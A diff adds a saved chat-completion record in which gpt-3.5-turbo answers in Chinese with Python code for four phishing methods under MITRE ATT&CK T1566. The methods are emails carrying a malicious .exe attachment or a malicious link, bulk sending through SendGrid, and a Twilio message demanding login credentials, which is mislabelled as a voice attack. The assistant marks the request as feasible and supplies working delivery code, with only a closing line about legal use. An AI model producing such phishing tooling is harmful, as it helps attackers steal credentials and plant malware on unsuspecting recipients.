@@ -1,0 +1,21 @@
+{
+  "id":"chatcmpl-8MZquxgX0KQUXPberY0V3ZsQAxarN",
+  "object":"chat.completion",
+  "created":1700391724,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[可實現]\n\n針對Mitre&Attack中的T1566 - Phishing，我們可以使用Python來實現以下四種方式：\n\n1. 傳送帶有惡意附件的spearphishing郵件\n2. 傳送帶有惡意連結的spearphishing郵件\n3. 透過第三方服務進行spearphishing郵件攻擊\n4. 使用語音通訊進行spearphishing攻擊\n\n以下是分別實現這四種方式的程式碼示例：\n\n方式一：傳送帶有惡意附件的spearphishing郵件\n\n```python\nimport smtplib\nfrom email.mime.multipart import MIMEMultipart\nfrom email.mime.text import MIMEText\nfrom email.mime.base import MIMEBase\nfrom email import encoders\n\ndef send_spearphishing_attachment():\n    from_email = \"sender@example.com\"\n    to_email = \"recipient@example.com\"\n    subject = \"Important Document\"\n    body = \"Please find the attached document.\"\n\n    msg = MIMEMultipart()\n    msg['From'] = from_email\n    msg['To'] = to_email\n    msg['Subject'] = subject\n\n    msg.attach(MIMEText(body, 'plain'))\n\n    filename = \"malicious_file.exe\"  # 惡意附件的檔案名稱\n    attachment = open(\"path/to/malicious_file.exe\", \"rb\")  # 惡意附件的檔案路徑\n    part = MIMEBase('application', 'octet-stream')\n    part.set_payload((attachment).read())\n    encoders.encode_base64(part)\n    part.add_header('Content-Disposition', \"attachment; filename= %s\" % filename)\n    msg.attach(part)\n\n    server = smtplib.SMTP('smtp.gmail.com', 587)\n    server.starttls()\n    server.login(from_email, \"password\")\n    text = msg.as_string()\n    server.sendmail(from_email, to_email, text)\n    server.quit()\n\nsend_spearphishing_attachment()\n```\n\n方式二：傳送帶有惡意連結的spearphishing郵件\n\n```python\nimport smtplib\nfrom email.mime.multipart import MIMEMultipart\n\ndef send_spearphishing_link():\n    from_email = \"sender@example.com\"\n    to_email = \"recipient@example.com\"\n    subject = \"Important Information\"\n    body = \"Please click the following link to access the information: https://maliciouswebsite.com\"\n\n    msg = MIMEMultipart()\n    msg['From'] = from_email\n    msg['To'] = to_email\n    msg['Subject'] = subject\n    msg.attach(MIMEText(body, 'plain'))\n\n    server = smtplib.SMTP('smtp.gmail.com', 587)\n    server.starttls()\n    server.login(from_email, \"password\")\n    text = msg.as_string()\n    server.sendmail(from_email, to_email, text)\n    server.quit()\n\nsend_spearphishing_link()\n```\n\n方式三：透過第三方服務進行spearphishing郵件攻擊\n\n此方式需要先註冊第三方服務並獲取API金鑰，以下是使用SendGrid服務的範例：\n\n```python\nimport requests\n\ndef send_spearphishing_via_service():\n    url = \"https://api.sendgrid.com/v3/mail/send\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": \"Bearer API_KEY\"\n    }\n    payload = {\n        \"personalizations\": [\n            {\n              \"to\": [\n                {\n                  \"email\": \"recipient@example.com\"\n                }\n              ],\n              \"subject\": \"Important Announcement\"\n            }\n        ],\n        \"from\": {\n            \"email\": \"sender@example.com\"\n        },\n        \"content\": [\n            {\n              \"type\": \"text/plain\",\n              \"value\": \"Please pay attention to the attached document.\"\n            }\n        ]\n    }\n\n    response = requests.post(url, headers=headers, json=payload)\n\nsend_spearphishing_via_service()\n```\n\n方式四：使用語音通訊進行spearphishing攻擊\n\n此方式需要使用語音通訊的API服務，以下是使用Twilio服務的範例：\n\n```python\nfrom twilio.rest import Client\n\ndef send_spearphishing_voice():\n    account_sid = 'YOUR_ACCOUNT_SID'\n    auth_token = 'YOUR_AUTH_TOKEN'\n    client = Client(account_sid, auth_token)\n\n    message = client.messages.create(\n        body='This is an urgent message. Please provide your login credentials immediately.',\n        from_='+1234567890',  # Twilio號碼\n        to='+0987654321'  # 收件者號碼\n    )\n\n    print(message.sid)\n\nsend_spearphishing_voice()\n```\n\n以上是四種不同的方式使用Python實現Mitre&Attack中T1566 - Phishing的攻擊手法。請注意，應尊重法律並僅用於學習和測試目的。"
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":1023,
+    "completion_tokens":1173,
+    "total_tokens":2196
+  }
+}
